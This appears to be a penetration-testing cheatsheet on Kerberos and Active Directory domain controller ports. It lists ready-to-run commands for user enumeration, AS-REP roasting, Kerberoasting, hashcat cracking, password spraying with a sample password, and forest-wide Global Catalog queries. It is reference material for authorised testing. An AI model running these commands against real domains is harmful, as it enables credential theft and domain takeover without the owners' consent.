---
tags: [pentest, cheatsheet, kerberos, ad, dc, gc, service, active-directory, both]
port: [88, 464, 3268, 3269]
phase: reference
---
# Kerberos and AD Services (88 / 464 / 3268 / 3269)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

These four ports are the **Domain Controller fingerprint**. See them and stop scanning randomly — focus shifts to AD-specific attacks. They confirm role; the actual attack surface is at 389 / 636 (LDAP) and 445 (SMB) on the same host.

| Port | Service | What it tells you |
| ---: | --- | --- |
| 88 | Kerberos | AS-REP Roasting on accounts without pre-auth. Kerberoasting on service accounts (SPN). Ticket forging once you have krbtgt. |
| 464 | kpasswd | Kerberos password change. Pure DC confirmation — not directly exploitable, but its presence means 88/389 are real. |
| 3268 | Global Catalog (LDAP) | Forest-wide LDAP. Same enum value as 389 but across **every domain** in the forest. Essential on multi-domain engagements. |
| 3269 | Global Catalog over SSL | Same as 3268, encrypted. |

**Why DC = crown jewel:** Compromise of any DC = compromise of the whole domain (DCSync gives you every hash). Compromise of a forest-root DC = compromise of the whole forest.

## Enumerate

```bash
# Confirm DC role
nmap -p 88,389,445,464,636,3268,3269 -sV -sC $IP
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.LOCAL',userdb=users.txt $IP

# Get the domain name without creds
nmap -p 445 --script smb-os-discovery $IP
nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN
```

## User enumeration via Kerberos (no creds needed)

```bash
# kerbrute - fast username validation against AS-REQ responses
kerbrute userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Pre-auth not required => AS-REP roastable
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP -format hashcat -outputfile asrep.hashes
```

Crack: `hashcat -m 18200 asrep.hashes rockyou.txt`

## Kerberoasting (need any valid domain credential)

```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hashes
hashcat -m 13100 kerb.hashes rockyou.txt
```

## Password spray

```bash
kerbrute passwordspray -d $DOMAIN --dc $IP users.txt 'Winter2025!'
```

Lower lockout exposure than SMB spraying because failed AS-REQ doesn't increment the LDAP badPwdCount on most configs — **but** it does log Event 4768 with status 0x18, which a tuned SOC catches.

## Global Catalog enumeration

3268 lets you query attributes across **all domains in the forest** with a single bind:

```bash
ldapsearch -x -H ldap://$IP:3268 -D "$USER@$DOMAIN" -w "$PASS" -b "" -s sub "(objectClass=user)" sAMAccountName | grep sAMAccountName

# windapsearch hits GC by default if you point it at 3268
windapsearch -d $DOMAIN -u $USER@$DOMAIN -p $PASS --dc-ip $IP -m users --gc
```

Useful when the engagement scope says "the forest," not "this one domain."

## Pass-the-Ticket / Golden / Silver

Covered in depth elsewhere — port 88 is the protocol; the attacks are in:

- [[../06 - Gaining Access/15 - Kerberoasting]]
- [[../06 - Gaining Access/16 - AS-REP Roasting]]
- [[../06 - Gaining Access/18 - Pass-the-Ticket]]
- [[../07 - Post-Exploitation/Windows/46 - Golden Ticket]]
- [[../07 - Post-Exploitation/Windows/47 - Silver Ticket]]

## Related

- [[10 - LDAP LDAPS (389 636)]] — companion port; this is where most enum actually happens
- [[11 - SMB (445 139)]] — companion port; lateral movement vector
- [[../04 - Enumeration/09 - BloodHound]] — automated AD graphing
